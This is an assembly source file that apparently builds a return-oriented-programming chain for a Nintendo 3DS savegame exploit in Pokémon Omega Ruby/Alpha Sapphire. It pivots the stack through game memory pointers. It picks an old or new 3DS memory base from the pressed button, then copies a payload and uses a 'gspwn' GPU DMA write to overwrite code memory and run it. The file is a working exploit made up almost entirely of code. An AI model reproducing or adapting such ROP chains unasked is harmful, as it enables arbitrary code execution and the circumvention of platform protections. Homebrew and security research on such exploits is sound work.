.open "../oras_code/oras_code.bin",0x0
	initial_payload_size:
		.incbin "../oras_code/oras_code.bin"
	initial_payload_size_end:
.close

.nds

.include "oras_constants.s"
.include "oras_macros.s"

.create "../build/rop.bin",ORAS_SAVE_PICDATA_BUFFER_PTR

rop:

	; PIVOT
	.word ORAS_1ST_JMP_PTR ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
	.word ORAS_PREPIVOT ; 1st jump, allows us to load the value stored at r0+0x8 in r2, when we jump r0=ORAS_1ST_JMP_PTR so ORAS_ROP_START is loaded in r2
	.word ORAS_ROP_START ; the address in RAM where the rop start
	.word 0x0
	.word ORAS_2ND_JMP_PTR ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
	.word ORAS_PIVOT ; move r2 to sp 
					 ; then load the value stored at r0 in r2, so ORAS_2ND_JMP_PTR is stored in r2
					 ; then load the value stored at r2+0x10 in r2, so ROP_ORAS_NOP is stored in r2
					 ; then it jumps to r2
	.word 0x0
	.word 0x0
	.word ROP_ORAS_NOP

.fill (ORAS_ROP_START - .),0x0

	; ROP
	
	dereference_to_r0 ORAS_PAD_STATE
	r0_and BUTTON_SELECT
	compare_r0_0
	store_to_addr_if_nequal 0x14000000 + 0x04000000 - 0x00500000, (ORAS_SAVE_PICDATA_BUFFER_PTR + HAX_PAYLOAD_OFFSET - 0x8)
	; if select pressed store the O3DS code_linear_base 8 bytes before the hax payload
	; it will be later used to gspwn the code and hax payload
	
	dereference_to_r0 ORAS_PAD_STATE
	r0_and BUTTON_START
	compare_r0_0
	store_to_addr_if_nequal 0x14000000 + 0x07C00000 - 0x00500000, (ORAS_SAVE_PICDATA_BUFFER_PTR + HAX_PAYLOAD_OFFSET - 0x8)
	; if start pressed store the N3DS code_linear_base 8 bytes before the hax payload
	; it will be later used to gspwn the code and hax payload
	
	memcpy LINEAR_BUFFER, ORAS_SAVE_PICDATA_BUFFER_PTR + (rop_end - rop), initial_payload_size_end - initial_payload_size
	flush_dcache LINEAR_BUFFER, 0x00100000
	gspwn (ORAS_SAVE_PICDATA_BUFFER_PTR + HAX_PAYLOAD_OFFSET - 0x8), (INITIAL_PAYLOAD_VA - 0x00100000), LINEAR_BUFFER, 0x4000
	; code_linear_base used during the last successful execution is stored 0x8 bytes before the hax payload in the save file
	
	sleep 400*1000*1000, 0
	
	.word INITIAL_PAYLOAD_VA
	
	.word 0xDEAF0000	
	
rop_end:

.close